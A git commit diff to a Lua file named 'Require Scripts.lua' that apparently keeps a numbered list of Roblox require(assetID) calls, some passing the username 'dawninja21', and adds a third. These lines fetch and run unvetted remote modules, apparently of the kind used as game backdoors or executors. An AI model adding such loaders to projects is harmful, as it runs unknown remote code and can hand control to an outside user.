c59f39177eb90768c385c2eb4caed251251a1df9
TheGodE6 <110555637+TheGodE6@users.noreply.github.com>
2024-06-22 17:36:16 -0400

    Update Require Scripts.lua

--- Require Scripts.lua
+++ Require Scripts.lua
@@ -1,4 +1,6 @@
 ---- idc what u say i aint remoiving this
-require 6324372525
+1. require 6324372525
 
-require(10868847330):pls("dawninja21")
+2. require(10868847330):pls("dawninja21")
+
+3. require(9567162466)("dawninja21")
